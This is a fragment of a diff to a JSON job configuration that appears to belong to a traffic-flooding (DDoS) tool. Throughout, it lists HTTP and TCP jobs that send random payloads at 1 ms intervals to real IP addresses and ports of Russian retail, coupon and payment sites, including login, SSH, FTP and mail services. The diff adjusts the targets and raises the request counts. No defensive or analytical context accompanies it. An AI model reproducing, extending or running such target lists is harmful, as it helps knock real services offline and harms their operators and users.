-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2243,22 +1914,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://am.wildberries.ru/"
+          "path": "http://am.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.254.5:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2273,7 +1944,7 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2282,17 +1953,17 @@
         "client": {
           "static_host": {
             "addr": "194.1.214.101:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://streamer.wildberries.ru/"
+          "path": "https://streamer.wildberries.ru/"
         },
         "client": {
           "static_host": {
@@ -2303,22 +1974,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://mirror.wildberries.ru/"
+          "path": "http://mirror.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "194.1.214.254:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2333,22 +2004,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://by.wildberries.ru/"
+          "path": "http://by.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.252.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2363,22 +2034,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://by.wildberries.ru/"
+          "path": "http://by.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.253.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2393,22 +2064,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://by.wildberries.ru/"
+          "path": "http://by.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.254.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2423,22 +2094,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://kz.wildberries.ru/"
+          "path": "http://kz.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.252.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2453,22 +2124,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://kz.wildberries.ru/"
+          "path": "http://kz.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.253.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2483,22 +2154,22 @@
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://kz.wildberries.ru/"
+          "path": "http://kz.wildberries.ru/"
         },
         "client": {
           "static_host": {
             "addr": "185.138.254.2:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 4,
+      "count": 3,
       "args": {
         "request": {
           "method": "GET",
@@ -2512,155 +2183,34 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.biglion.ru/shops/kupons/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.2:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.biglion.ru/shops/kupons/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.2:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://edit.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.238:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://edit.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.238:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://edit.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.238:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
-        "address": "178.21.12.238:3443",
+        "address": "178.248.234.2:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
-        "address": "178.21.12.238:3443",
+        "address": "178.248.234.2:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
-        "address": "178.21.12.238:4443",
+        "address": "178.21.12.238:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 4,
+      "count": 3,
       "args": {
-        "address": "178.21.12.238:5443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://edit.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.238:8080",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 4,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://edit.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.238:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "178.21.12.238:10443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 4,
-      "args": {
-        "address": "178.21.12.238:18443",
+        "address": "178.21.12.238:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
@@ -2670,14 +2220,109 @@
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://merchant.frendi.ru/"
+          "path": "https://edit.biglion.ru/"
         },
         "client": {
           "static_host": {
-            "addr": "178.21.12.237:80",
-            "is_tls": "false"
+            "addr": "178.21.12.238:443",
+            "is_tls": "true"
           }
         }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:3443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 3,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://edit.biglion.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.21.12.238:3443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:4443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:5443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:10443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.238:18443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.237:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.237:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.237:1443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
@@ -2689,7 +2334,7 @@
         },
         "client": {
           "static_host": {
-            "addr": "178.21.12.237:443",
+            "addr": "178.21.12.237:1443",
             "is_tls": "true"
           }
         }
@@ -2698,33 +2343,24 @@
       "type": "tcp",
       "count": 3,
       "args": {
-        "address": "178.21.12.237:1443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
-      "args": {
-        "address": "178.21.12.237:1443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
-      "args": {
         "address": "178.21.12.237:2443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
+      "type": "http",
       "count": 3,
       "args": {
-        "address": "178.21.12.237:2443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
+        "request": {
+          "method": "GET",
+          "path": "https://merchant.frendi.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.21.12.237:2443",
+            "is_tls": "true"
+          }
+        }
       }
     }, {
       "type": "tcp",
@@ -2735,12 +2371,19 @@
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
+      "type": "http",
       "count": 3,
       "args": {
-        "address": "178.21.12.237:3443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
+        "request": {
+          "method": "GET",
+          "path": "https://merchant.frendi.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.21.12.237:3443",
+            "is_tls": "true"
+          }
+        }
       }
     }, {
       "type": "tcp",
@@ -2759,34 +2402,36 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
+      "type": "tcp",
       "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://merchant.frendi.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.237:8080",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.21.12.237:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
-      "type": "http",
+      "type": "tcp",
       "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://pay.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.235:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.21.12.235:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.235:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 3,
+      "args": {
+        "address": "178.21.12.235:1443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
@@ -2798,7 +2443,7 @@
         },
         "client": {
           "static_host": {
-            "addr": "178.21.12.235:443",
+            "addr": "178.21.12.235:1443",
             "is_tls": "true"
           }
         }
@@ -2807,33 +2452,24 @@
       "type": "tcp",
       "count": 3,
       "args": {
-        "address": "178.21.12.235:1443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
-      "args": {
-        "address": "178.21.12.235:1443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
-      "args": {
         "address": "178.21.12.235:2443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
+      "type": "http",
       "count": 3,
       "args": {
-        "address": "178.21.12.235:2443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
+        "request": {
+          "method": "GET",
+          "path": "https://pay.biglion.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.21.12.235:2443",
+            "is_tls": "true"
+          }
+        }
       }
     }, {
       "type": "tcp",
@@ -2844,12 +2480,19 @@
         "interval_ms": 1
       }
     }, {
-      "type": "tcp",
+      "type": "http",
       "count": 3,
       "args": {
-        "address": "178.21.12.235:3443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
+        "request": {
+          "method": "GET",
+          "path": "https://pay.biglion.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "178.21.12.235:3443",
+            "is_tls": "true"
+          }
+        }
       }
     }, {
       "type": "tcp",
@@ -2868,49 +2511,28 @@
         "interval_ms": 1
       }
     }, {
-      "type": "http",
+      "type": "tcp",
       "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://pay.biglion.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.21.12.235:8080",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.21.12.235:8080",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
-      "type": "http",
+      "type": "tcp",
       "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.holodilnik.ru/smartphones_gadgets/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.211.221.55:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "195.211.221.55:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
-      "type": "http",
+      "type": "tcp",
       "count": 3,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.holodilnik.ru/smartphones_gadgets/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "195.211.221.55:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "195.211.221.55:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
@@ -2974,7 +2596,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -2989,7 +2611,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3004,45 +2626,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "83.69.203.11:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://crm.holodilnik.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.69.203.11:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "83.69.203.11:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "83.69.203.11:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://crm.holodilnik.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.69.203.11:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3056,38 +2664,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.dns-shop.ru/catalog/17a8e9ed16404e77/stirka-i-sushka/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.165.123.176:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.165.123.176:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.165.123.176:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.dns-shop.ru/catalog/17a8e9ed16404e77/stirka-i-sushka/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.165.123.176:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3102,7 +2696,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "23.105.230.84:21",
         "body": "{{ random_payload 10 }}",
@@ -3110,7 +2704,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "23.105.230.84:25",
         "body": "{{ random_payload 10 }}",
@@ -3118,22 +2712,22 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://prozapass.ru/"
+          "path": "http://prozapass.ru/"
         },
         "client": {
           "static_host": {
             "addr": "23.105.230.84:80",
-            "is_tls": "true"
+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3148,45 +2742,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "185.165.123.145:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://club.dns-shop.ru/digest/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.165.123.145:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "185.165.123.145:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "185.165.123.145:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://club.dns-shop.ru/digest/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.165.123.145:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3200,23 +2780,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://h243-50.dns-shop.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "194.1.243.50:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "194.1.243.50:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "194.1.243.50:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3230,38 +2811,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://h243-50.dns-shop.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "194.1.243.50:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "194.1.240.80:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "194.1.240.80:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://h240-80.dns-shop.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "194.1.240.80:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3275,38 +2842,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://h240-80.dns-shop.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "194.1.240.80:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "178.248.232.33:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.232.33:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.lamoda.ru/men-home/?sitelink=topmenuM"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.33:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3321,22 +2874,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.232.33:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3351,7 +2889,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3366,7 +2904,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.43:22",
         "body": "{{ random_payload 10 }}",
@@ -3374,7 +2912,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.43:25",
         "body": "{{ random_payload 10 }}",
@@ -3382,7 +2920,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.43:22016",
         "body": "{{ random_payload 10 }}",
@@ -3390,7 +2928,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.45:22",
         "body": "{{ random_payload 10 }}",
@@ -3398,7 +2936,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.45:25",
         "body": "{{ random_payload 10 }}",
@@ -3406,45 +2944,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "178.213.78.45:5666",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://job.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.248.234.51:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.234.51:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://job.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3458,38 +2982,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 5,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://gatemgmt.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.248.234.51:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "178.248.234.51:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://gatemgmt.lamoda.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.234.51:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -3504,7 +3014,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "95.213.246.92:21",
         "body": "{{ random_payload 10 }}",
@@ -3512,7 +3022,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "95.213.246.92:22",
         "body": "{{ random_payload 10 }}",
@@ -3520,53 +3030,15 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "95.213.246.92:123",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://pixel24.ru/vcd-1085/catalog.html"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.213.246.92:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://pixel24.ru/vcd-1085/catalog.html"
-        },
-        "client": {
-          "static_host": {
-            "addr": "95.213.246.92:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 3,
-      "args": {
-        "address": "95.213.246.92:30865",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "95.213.246.92:443",
         "body": "{{ random_payload 10 }}",
@@ -3574,37 +3046,61 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.220-volt.ru/"
+          "path": "https://pixel24.ru/vcd-1085/catalog.html"
         },
         "client": {
           "static_host": {
-            "addr": "193.93.30.3:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.220-volt.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.93.30.3:443",
+            "addr": "95.213.246.92:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
+      "args": {
+        "address": "95.213.246.92:30865",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 5,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://pixel24.ru/user/loginOrRegister"
+        },
+        "client": {
+          "static_host": {
+            "addr": "95.213.246.92:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "193.93.30.3:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "193.93.30.3:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
       "args": {
         "address": "193.93.29.82:21",
         "body": "{{ random_payload 10 }}",
@@ -3612,53 +3108,15 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "193.93.29.82:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://franchise.220-volt.ru/pvz/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.93.29.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
